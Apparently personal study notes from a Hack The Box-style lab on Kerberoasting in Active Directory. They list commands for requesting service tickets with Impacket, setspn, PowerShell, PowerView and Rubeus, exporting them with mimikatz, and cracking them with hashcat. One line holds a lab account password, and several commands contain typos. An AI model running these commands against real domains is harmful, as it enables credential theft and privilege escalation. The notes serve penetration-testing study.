# Kerberoasting

<aside>
💡

For lateral movement/priv. esc

Targets Service Principal Name accounts (SPN)

Any low priviliges user can request for service ticket

</aside>

<aside>
💡

Depending on your position in a network this attack can be performed in multiple ways

- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) /netonly
</aside>

<aside>
💡

Toolkit:

Impacket’s GetUserSPNs.py

A combination of built-in setspn.exe Windows binary, Powershell and Mimikatz

From windows tools such as PowerView, Rubeus and other PowerShell scripts

</aside>

<aside>
💡

Prerequisites 

Domain user credentials (cleartext or just an NTLM has if using Impacket)

A shell in the context of a domain user, or account such as SYSTEM

</aside>

# Linux

1. Listing the SPNs in the domain (we need valid credentials)
    - `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend`
    - give the password when prompted
2. Pull the TGS tickets for offline cracking using `-request` (all services)
    - `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request`
3. Pull the TGS for a specific account eg. `-request-user sqldev`
    - `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev`
4. Check which group this our user belongs to
    - ldapsearch -x -H ldap://172.16.5.5 -D "SAPService@inlanefreight.local" -w '!SapperFi2' -b "DC=inlanefreight,DC=local" "(sAMAccountName=SAPService)" memberof

## Windows

### Manual Way

- Enumerating SPNs with setspn.exe
    - `setspn.exe -Q */*`
- Targeting a single user
    - `Add-Type -AssemblyName System.IdentityModel`
        - Add a .NET framework class to our PowerShell session
        - `-AssemblyNamespecift` assembly that contains types that we interested in using
        - `Systtem.IdentityModel` is a namespace that contains different classes for building security token services
    - `New-Object System.IdentityModel.Tokens.KerberoRequestorSecurityToken -ArgumentList “MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433”`
        - `New-Object` to create an instance of a .NET Framwork object
        - We will use the `System.IdentityModel.Tokens` namespace and `KerberoRequestorSecurityToken` class
- Retrieving all tickets using setspn.exe
    - `PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }`
    - Tickets are loaded to memory. We can retrieve them using mimikatz
        1. `mimikatz.exe`
        2. `base64 /out:true` 
            1. If we dont specify, mimikatz will export data to kirbi file
        3. `kerberos::list /export`
            1. This will give us all the tickets in the memory in base64 format
    - Back to our attacker machine
        - `echo ‘<base64 encoded blob>’ | tr -d \\n > encoded_file`
        - `cat encoded_file | base64 -d > sqldev.kirbi`
        - `kirbi2john sqldev.kirbi -o crack_file`
        - `sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat`
            - To make it usable by hashcat
        - `hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt`

## Automated Way

### PowerView

- View accounts
    - `Import-Module .\PowerView.ps1`
    - `Get-DomainUser * -spn | select samaccountname`
- Target specific user
    - `Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat`
- Export all tickets to a CSV file
    - `Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation`

## Rubeus

<aside>
💡

- Performing Kerberoasting and outputting hashes to a file
- Using alternate credentials
- Performing Kerberoasting combined with a pass-the-ticket attack
- Performing "opsec" Kerberoasting to filter out AES-enabled accounts
- Requesting tickets for accounts passwords set between a specific date range
- Placing a limit on the number of tickets requested
- Performing AES Kerberoasting
</aside>

- `.\Rubeus.exe kerberoast /stats`
- `.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap`
    - /nowrap to make the hash easily copy
    - admoincount set to 1: high value targets
- `.\Rubeus.exe kerberoast /user:testspn /nowra`
- `/teldeg` we can downgrade the encryption type when requesting a new ticket. This will speed up our whole process by ton
    - Note: This does not work against a Windows Server 2019 Domain Controller